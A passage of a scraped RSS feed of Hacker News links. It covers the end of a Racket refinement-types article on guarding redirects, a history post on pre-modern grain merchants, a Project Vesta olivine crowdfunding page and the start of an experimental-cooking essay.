<p>The `require/typed` function above allows us to specify an opaque type name along with a predicate that returns `true` for some input.</p><p>The only problem with the type as defined is that it has no notion that it is also a `String`. That means if we have some function that returns an `Internal-Gemini-Path`, we can't use it in places we ought to be able to. To get around this issue, we can add one more line and complete our type definition.</p><pre>(define-type Gemini-Path (Refine [s : String] (: s Internal-Gemini-Path)))
</pre>
<p>We don't actually need a Refinement here, we could just as well define `Gemini-Path` to be `(Intersection String Internal-Gemini-Path)`, but it (subjectively) clarifies the intent to declare it via `Refine`.</p><p>Finally, we can update the type of `redirect`:</p><pre>(: redirect (-&gt; Gemini-Path response))
</pre>
<p>Now, developers will get a type error for attempting to use the API insecurely.</p><pre>(define input : String (get-insecure-input))
(redirect input)
</pre>
<p>But, with the help of Racket's occurrence typing, they have a simple path towards secure usage.</p><pre>(define input : String (get-insecure-input))

(if (gemini-path? input)
    (redirect input)
	(error "Error!"))
</pre>
<a href="https://docs.racket-lang.org/ts-reference/Experimental_Features.html?q=refine#%28form._%28%28lib._typed-racket%2Fbase-env%2Fbase-types-extra..rkt%29._.Refine%29%29">Racket docs: RefineÂ¹</a><br><a href="https://gmb.is/">Home</a><br></div>]]>
            </description>
            <link>https://gmb.is/refinement-types</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240926</guid>
            <pubDate>Sat, 22 Aug 2020 01:55:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Gentle Introduction to Zero-Knowledge Proofs with Hands-On Examples]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24240915">thread link</a>) | @mariorz
<br/>
August 21, 2020 | https://dochdoch.gitlab.io/snark_intro/snark_intro_front/ | <a href="https://web.archive.org/web/*/https://dochdoch.gitlab.io/snark_intro/snark_intro_front/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dochdoch.gitlab.io/snark_intro/snark_intro_front/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240915</guid>
            <pubDate>Sat, 22 Aug 2020 01:53:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bread, How Did They Make It? Part IV: Markets, Merchants and the Tax Man]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24240677">thread link</a>) | @Kednicma
<br/>
August 21, 2020 | https://acoup.blog/2020/08/21/collections-bread-how-did-they-make-it-part-iv-markets-and-non-farmers/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/08/21/collections-bread-how-did-they-make-it-part-iv-markets-and-non-farmers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>As the fourth and final part (<a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">I</a>, <a href="https://acoup.blog/2020/07/31/collections-bread-how-did-they-make-it-part-ii-big-farms/">II</a>, <a href="https://acoup.blog/2020/08/06/collections-bread-how-did-they-make-it-part-iii-actually-farming/">III</a>) of our look at the basic structure of food production in the pre-modern world (particularly farming grain to make bread), this week we’re going to look at how at least some of the delicious food we made in the last post might make its way into the hands of people who are <em>not</em> <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>or even<a href="https://acoup.blog/2020/07/31/collections-bread-how-did-they-make-it-part-ii-big-farms/"> farm owners</a>.</p>



<p>In the previous three posts, I have mostly just used the magic word ‘markets’ to describe how the food produced in the countryside gets to the cities and people who are not farmers.  As we’ll see in this post, that is a bit of an oversimplifying fib, both in that the phrase ‘markets’ covers a <em>lot </em>of complexity, but also (as we’ll see) some of the major drivers of moving that food from the countryside into towns doesn’t involve money <em>or</em> market interactions.  That said, we’re going to <em>start</em> with market transactions, because while they are actually the minority-type in many of these societies, they are more readily familiar and understandable, I suspect, to modern readers.  Then we’ll move to <em>extraction</em> as the other category.</p>



<p>Speaking of extraction, as always, if you like what you are reading here, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreo</a>n. And if you want updates whenever a new post appears, you can click the button below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts, as well as my occasional ancient history, foreign policy or pop-culture thoughts.</p>






<h2>Point of Sale</h2>



<p>I want to start by leaning on (with small modifications for clarity) Paul Erdkamp’s taxonomy of the various options by which food might get into the stream of commerce.  A small farmer might sell their grain (I) directly to city-dwellers, (II) indirectly, via urban middlemen and grain merchants, either in the market or (III) ‘at the gate’ (meaning selling to merchants who come out to the farm in order to buy; the difference being who transports the food to the city), (IV) to itinerant traders at periodic rural markets or (V) to other local small farmers.  As we’ll see, <em>large </em>landholders have a <em>somewhat</em> larger range of options within this taxonomy, but the fundamentals are the same.</p>



<p>While all of these sale methods certainly happened, in every society I have looked at, Option I – selling directly to city-dwellers – is fairly rare for grains and other bulk agricultural goods.  Market <em>gardeners</em>, selling fruits, vegetables (and sometimes flowers) often do sell this way, maintaining a high-intensity garden near town and a shop or stall in the town market.  Likewise, while Option V – small-scale trade between farmers – absolutely happens, it is typically non-monetary: the banqueting of neighbors discussed in the first post.  Where it is monetary, it is typically quite small scale and very short distance.  By and large, small and mid-sized farmers hadn’t the time, expertise or infrastructure to sell their goods directly.  They needed to be farming, not manning a market stall or trying to figure out how to store their goods close to the point of sale.  And of course large landowners, being rich, aren’t going to stand in the market square either (and in many cases don’t want their obvious representative doing so either,  see below).  So while I and V happen, they’re not too common or too large a portion of total trade and we may lay them aside for this discussion.</p>



<p>That leaves Options II, III and IV, all of which involve selling grain to a middle-man merchant of some sort.  The main difference is the location of sale (in town, at the gate, or at periodic rural markets).  Outside of large cities and major ports, markets were likely to be <em>periodic</em>, occurring only on certain days (typically around once per week).  In Roman Italy, these were the <em>nundinae</em> (‘ninth days,’ although it was an 8-day cycle as the Romans count inclusively); the <em>nundinae</em> were minor festivals, days of rest and merrymaking, but they were also the days when the rural markets would be open – the rest-day from agricultural labor enabled farmers to head into local towns to buy or sell whatever they needed (interestingly, at Rome, the <em>nundinae</em> were <em>dies nefasti</em> – state business couldn’t generally be conducted on them – so poor farmers hoping to use their day off to participate politically were out of luck).  Similar periodic markets are common in the Middle Ages (and even today; most ‘farmer’s markets’ in the United States are periodic, <a href="http://www.carrborofarmersmarket.com/">including my town’s</a>).  The periodic nature of these markets is an adaptation to agricultural rhythms; for a market to function there need to be a lot of people together all at once and the small towns that dotted the countryside simply didn’t have the density to do that all of the time.</p>



<figure><img data-attachment-id="4249" data-permalink="https://acoup.blog/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg" data-orig-size="2325,663" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/08/fresco_from_the_house_of_julia_felix_pompeii_depicting_scenes_from_the_forum_market.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Merchant#/media/File:Fresco_from_the_House_of_Julia_Felix,_Pompeii_depicting_scenes_from_the_Forum_market.JPG">Via Wikipedia</a>, a fresco showing market activity, with merchants showing off wares of fabric (left) and goods in pots (center) from the House of Julia Felix at Pompeii, first century CE.  Please note: the importance of pottery in modern archaeology has given many students and the general public the idea that the ancients were always shipping pots around for sale, as if there was a vast market in pottery.  <strong>Generally, people were buying what was in the pot, not the pot itself</strong>.</figcaption></figure>



<p>But as noted, our farmers are unlikely to be selling their grain directly to customers.  Instead, they are likely to be using some sort of middle-man merchant, which brings us to:</p>



<h2>Merchants!</h2>



<p>Merchants are a bit of a break from the people we have so far discussed in that they, by definition, live in the realm of the <em>market</em> (in the economic sense, although often also in a physical sense).  As we’ve seen so much of the world of our farmers and even our millers and bakers was governed by <em>non-market</em> interactions: horizontal and vertical social ties that carried expectations that weren’t quite transactional and certainly not monetized.  By contrast, merchants work with transactions and tend to be the <em>first</em> group in any society to attempt to monetize their operations once money becomes available.  I find students are often quick to feel identity with the merchant class, because these folks are more likely to travel, more likely to use money, more likely to employ or be employed in wage-labor; they feel more like modern people.</p>



<p>It thus tends to come as something of a surprise that with <em>stunning</em> consistency, <strong>the merchant class tended to be at best cordially disliked and at worst <em>despised</em> by the broader community</strong> (although not typically to the point of suffering legal disability, as did some other jobs; see S. Bond, <em>Trade and Taboo: Disreputable Professions in the Roman Mediterranean</em> (2016) for this in Rome).  This often strikes students as strange, both because we tend to think rather better of our own modern merchants but also because the image they have of the merchant class certainly looks elite.</p>



<figure><img data-attachment-id="4257" data-permalink="https://acoup.blog/britlibaddms35166apocalypseunkfolio3sealblackhorse/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg" data-orig-size="1134,766" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="britlibaddms35166apocalypseunkfolio3sealblackhorse" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/08/britlibaddms35166apocalypseunkfolio3sealblackhorse.jpg 1134w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Merchant#/media/File:BritLibAddMS35166ApocalypseUnkFolio3SealBlackHorse.jpg">Via Wikipedia</a>, a manuscript illustration showing the Horseman of Famine depicted as a grain merchant (from Revalations 6:5-6), holding the scales he would use to measure out grain.</figcaption></figure>



<p>For the farmers who need to sell their crops (for reasons we will get to in a moment) and purchase the things they need that they cannot produce, the merchant feels like an adversary: always pushing his prices to his best advantage.  We expect this, but remember that our pre-modern farmers are just <em>not that exposed to market interactions</em>; most of their relationships are reciprocal, not transactional – the horizontal relationships we discussed before.  The merchant’s ‘money-grubbing’ feels like a betrayal of trust in a society where you banquet your neighbors in the good years so they’ll help you in the bad years.  <strong>The necessary function of a merchant is to transgress the ‘rules’ of village interactions which – and this <em>resounds</em> from the sources – the farmers tend to understand as being ‘cheated.’</strong></p>



<p>At the same time, <strong>while most merchant types are humble, the high-risk and potentially high-reward involved in trade meant that <em>some</em> merchants </strong>(again, a small number) <strong>could become <em>very</em> rich</strong>.  That, as you might imagine, <strong>did not go over well for the traditionally wealthy in these societies</strong>, the large landholders.  Again, the values here often strike modern readers as topsy-turvy compared to our own, but to the elite large landholders (who dominate the literary and political culture of their societies), the <em>morally correct</em> way to earn great wealth is to inherit it (or capture it in war).  The <em>morally correct</em> way to hold that wealth is with large landed estates.  Anything else is <em>morally</em> suspect, and so the idea that a successful merchant could – by a process that again, strikes the large landholder, just like the small farmer, as ‘cheating’ – leap-frog the social pyramid and skip to the top, without putting in the work at either having distinguished wealthy ancestors <em>or</em> tremendous military success was an open insult to elite values.  Often laws were put in place to limit the ability of wealthy non-aristocrats (likely merchants or successful artisans) from displaying their wealth (<a href="https://en.wikipedia.org/wiki/Sumptuary_law">sumptuary laws</a>) so as to keep them from competing with the aristocrats; at Rome, senators were forbidden from owning ships with much the same logic (Roman senators being clever, they still invested in trade through proxies while at the same time disapproving of the activity in public politics).</p>



<p>Such disdain appears, with varying justification, in the sources of every pre-modern agrarian society I’ve studied, to one degree or another.  One commonplace of Greek and Roman thinking – despite these being very active, maritime societies – was that the first production of ships and the first sailing was in some essential way a profanation of the divine realm of the sea, a space humans ought not have ever ventured into – and certainly not for anything as mean as profit (e.g. Euripides, <em>Medea</em> 1-6; Catullus. 64.1-20; Valerius Flaccus, <em>Argonautica</em> 627-632; Seneca, <em>Medea</em> 1-12; 301-379, <em>inter alia</em> – thanks to my old grad school pals <a href="https://www.usf.edu/arts-sciences/departments/world-languages/about-us/hedrick.aspx">Buddy Hedrick</a> and <a href="http://gdrsd.org/gdrhs/faculty/michael-hoffman/">Michael Hoffman </a>for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/08/21/collections-bread-how-did-they-make-it-part-iv-markets-and-non-farmers/">https://acoup.blog/2020/08/21/collections-bread-how-did-they-make-it-part-iv-markets-and-non-farmers/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/08/21/collections-bread-how-did-they-make-it-part-iv-markets-and-non-farmers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240677</guid>
            <pubDate>Sat, 22 Aug 2020 01:04:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Help Turn the Tide on Climate Change]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24240431">thread link</a>) | @tempestn
<br/>
August 21, 2020 | https://projectvesta.org/crowdfunding/ | <a href="https://web.archive.org/web/*/https://projectvesta.org/crowdfunding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-page" data-elementor-id="4416" data-elementor-settings="[]">
			<div>
				<div>
							<section data-id="f4b942a" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
				<div>
				<div data-id="90fc97b" data-element_type="column">
			<div>
					<div>
				<div data-id="9fb2e9b" data-element_type="widget" data-settings="{&quot;sticky_hide_on&quot;:[&quot;mobile&quot;],&quot;sticky_video_margin&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;sticky_video_margin_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;sticky_video_margin_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true}}" data-widget_type="uael-video.default">
				<div>
					<div data-stickybottom="" data-device="false" data-vsticky="yes" data-hidedesktop="" data-hidetablet="" data-hidemobile="mobile" data-vsticky-viewport="0" data-autoplay="0">
						<div>
				<div data-src="https://www.youtube.com/embed/X5m3an3f5S0?rel=0&amp;start&amp;end&amp;controls=1&amp;mute=0&amp;modestbranding=1&amp;autoplay=1">
					<p><img src="https://i.ytimg.com/vi/X5m3an3f5S0/maxresdefault.jpg"></p>
				</div>
									
											</div>
		</div>
				</div>
				</div>
				<section data-id="f01b556" data-element_type="section">
						
		</section>
						</div>
			</div>
		</div>
				<div data-id="92d8d9e" data-element_type="column">
			<div>
					<div>
				
				<div data-id="7011d65" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Help fund the pilot projects needed to take coastal enhanced weathering from the lab to the beach. Your contribution will make Project Vesta’s first pilot studies a reality, allowing us to demonstrate to the world the advantages and viability of the process. Our open-source models will advance the field and facilitate future deployments on much larger scales.</p>
				</div>
				</div>
				<section data-id="23275c8" data-element_type="section">
						<div>
				<div>
				
				<div data-id="c13b547" data-element_type="column">
			<div>
					<div>
				<div data-id="09f6d47" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>(total is updated weekly)</h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				
				<section data-id="e060fc3" data-element_type="section">
						
		</section>
				<div data-id="aa6c2be" data-element_type="widget" data-widget_type="wp-widget-yith_wc_donations_form.default">
				<div>
			<h5>Enter an amount or choose below</h5><div>
    
    <p><img src="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-admin/images/wpspin_light.gif" alt="loading" width="16" height="16"></p>
</div>
		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="174a7e7" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
				<div>
				<div data-id="2d184e7" data-element_type="column">
			<div>
					<div>
				<section data-id="2959877" data-element_type="section">
						<div>
				<div>
				<div data-id="20d0a7a" data-element_type="column">
			<div>
					<div>
				<div data-id="7478fd5" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Help Turn The Tide On Climate Change</h2>		</p>
				</div>
				<div data-id="bfec0fa" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>To avoid the worst effects of climate change, we need to remove massive quantities of harmful carbon dioxide from the atmosphere – and soon.</p><p>At Project Vesta, we’re doing just that. We’re making green sand beaches which use natural wave energy to take carbon dioxide out of the air. We accelerate a natural process which has been capturing carbon dioxide in rocks for billions of years. There’s 30 years of scientific research showing that this works.</p><p>We’re making our cheap, permanent carbon dioxide removal process freely available so it can be used anywhere in the world.&nbsp;</p></div>
				</div>
				</div>
				<div data-id="0012585" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="960" height="294" src="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-960x294.png" alt="" srcset="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-960x294.png 960w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-1400x429.png 1400w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-150x46.png 150w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-768x235.png 768w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-1536x471.png 1536w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal-600x184.png 600w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/olivine-weathering-acceelerated-with-rocks-on-tropical-beaches-for-co2-removal.png 1660w" sizes="(max-width: 960px) 100vw, 960px">											</p>
				</div>
				</div>
				<div data-id="cebc59a" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Inspired by Nature to Recreate Nature</h2>		</p>
				</div>
				<div data-id="fc76d0e" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>We’re a non-profit, raising $1.5M to fund two pilot sites where we’ll take this technology out of the lab and onto the beach. One study is designed to demonstrate the effects of adding olivine to a new environment, which allows us to establish the safety profile of the technique, and the second is designed to measure and help us optimize how quickly we remove carbon dioxide from the atmosphere.</span></p>
<p><img src="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/trl-pilot-projects-960x873.png" alt="" width="960" height="873" srcset="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/trl-pilot-projects-960x873.png 960w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/trl-pilot-projects-150x136.png 150w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/trl-pilot-projects-768x698.png 768w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/trl-pilot-projects-600x545.png 600w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/trl-pilot-projects.png 1297w" sizes="(max-width: 960px) 100vw, 960px"></p></div>
				</div>
				</div>
				<div data-id="7a07a27" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Help Fund Our Pilot Demonstration Project(s)</h2>		</p>
				</div>
				<div data-id="3119839" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>We’re a non-profit, raising $1.5M to fund two pilot sites where we’ll take this technology out of the lab and onto the beach. One study is designed to demonstrate and establish the safety of the technique, and the second type of experiments will measure how quickly we remove carbon dioxide from the atmosphere in varying conditions. These two processes are the cornerstones that the will allow us to create a model that will enable us to quantify the carbon dioxide removal rate of the process.</span></p></div>
				</div>
				</div>
				<div data-id="3cb65f2" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Road Map to Global Deployment</h2>		</p>
				</div>
				<div data-id="c6d59f8" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>These two studies form a key part of our roadmap, which is designed not only to prove that the process works, but also to create an open-source Coastal Enhanced Weathering Integrated Assessment Model (CEWIAM), which is will enable the deployment of additional projects and be available to all. This will mean this cheap, permanent method for carbon removal can be rolled out all over the world.</span></p><p><img src="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-960x390.png" alt="" width="960" height="390" srcset="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-960x390.png 960w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-1400x569.png 1400w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-150x61.png 150w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-768x312.png 768w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-1536x624.png 1536w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240-600x244.png 600w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2240.png 1936w" sizes="(max-width: 960px) 100vw, 960px"></p></div>
				</div>
				</div>
				
				<div data-id="5942986" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Your donation will fund materials, equipment, and research staff to make the pilot projects happen.</span></p><p><img src="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2272.png" alt="" width="600" height="306" srcset="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2272.png 600w, https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-content/uploads/Image-2272-150x77.png 150w" sizes="(max-width: 600px) 100vw, 600px"></p></div>
				</div>
				</div>
				
				<div data-id="5cd31b3" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>We need your help. Humanity needs your help. The planet needs your help. Your donation goes directly into the fight against climate change.</span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="f9a3a5e" data-element_type="column">
			<div>
					<div>
				<div data-id="a863521" data-element_type="widget" data-widget_type="call-to-action.default">
				<div>
					<div>
					
							<div>
				
									<h2>
						Grain of Hope					</h2>
				
									<div>
						<p><b>$25</b></p><p>Single grain of San Carlos olivine suspended in a sand timer vial, symbolizing the hope that olivine can stop time from running out for us to reverse global warming. </p></div>
				
									
							</div>
						</div>
				</div>
				</div>
				
				<div data-id="da4c715" data-element_type="widget" data-widget_type="call-to-action.default">
				<div>
					<div>
					
							<div>
				
									<h2>
						Small Size Olivine					</h2>
				
									<div>
						<p><b>$100</b></p><p>A piece of beautiful olivine basalt from the San Carlos Apache Nation in Arizona					</p></div>
				
									
							</div>
						</div>
				</div>
				</div>
				<div data-id="88dc510" data-element_type="widget" data-widget_type="call-to-action.default">
				<div>
					<div>
					
							<div>
				
									<h2>
						Medium Size Olivine					</h2>
				
									<div>
						<p><b>$250</b></p><p>A medium-sized piece of beautiful olivine basalt from the San Carlos Apache Nation in Arizona					</p></div>
				
									
							</div>
						</div>
				</div>
				</div>
				<div data-id="369676c" data-element_type="widget" data-widget_type="call-to-action.default">
				<div>
					<div>
					
							<div>
				
									<h2>
						Large Size Olivine					</h2>
				
									<div>
						<p><b>$500</b></p><p>A large-sized piece of beautiful olivine basalt from the San Carlos Apache Nation in Arizona					</p></div>
				
									
							</div>
						</div>
				</div>
				</div>
				<div data-id="d850099" data-element_type="widget" data-widget_type="call-to-action.default">
				<div>
					<div>
					
							<div>
				
									<h2>
						Large Size Olivine					</h2>
				
									<div>
						<p><b>$500</b></p><p>A large-sized piece of beautiful olivine basalt from the San Carlos Apache Nation in Arizona					</p></div>
				
									
							</div>
						</div>
				</div>
				</div>
				<div data-id="8c01bb4" data-element_type="widget" data-widget_type="wp-widget-yith_wc_donations_form.default">
				<div>
			<h5>Donate Any Amount</h5><div>
    
    <p><img src="https://2bsktt48m93q1jv0hwys20fa-wpengine.netdna-ssl.com/wp-admin/images/wpspin_light.gif" alt="loading" width="16" height="16"></p>
</div>
		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="2c23ce7" data-element_type="section">
						
		</section>
						</div>
			</div>
		</div></div>]]>
            </description>
            <link>https://projectvesta.org/crowdfunding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240431</guid>
            <pubDate>Sat, 22 Aug 2020 00:26:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experimental Cooking Is a Joyful Pursuit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24240413">thread link</a>) | @laybak
<br/>
August 21, 2020 | https://knowledgeartist.org/articles/51b7b831-515b-4ad0-ad4d-616cbbe180c1/why-i-started-experimental-cooking-a-pursuit-of-joy | <a href="https://web.archive.org/web/*/https://knowledgeartist.org/articles/51b7b831-515b-4ad0-ad4d-616cbbe180c1/why-i-started-experimental-cooking-a-pursuit-of-joy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>I am amateur cook with sloppy form. And I don't plan on ever becoming a pro.</span></p> <p><span>Cooking to me is not about creating the best tasting dish in the world. Rather, it is an outlet of expression, a means to evoke sensations. </span></p> <p><span>In this article, I share my </span> <em>life-long pursuit of joy</em> <span> in my home kitchen.</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/sushi%20ice%20cream.png"></p> <p><em>Sushi Ice Cream: Salmon neta on rice ice cream</em></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/cooking-burdock.png"></p> <p><em>Ox Tail, with Variations of Burdock Roots</em></p>  <p><h2><span>Total Work of Art</span></h2></p> <p><span>Food is the </span> <strong>fullest form of art</strong> <span> to me
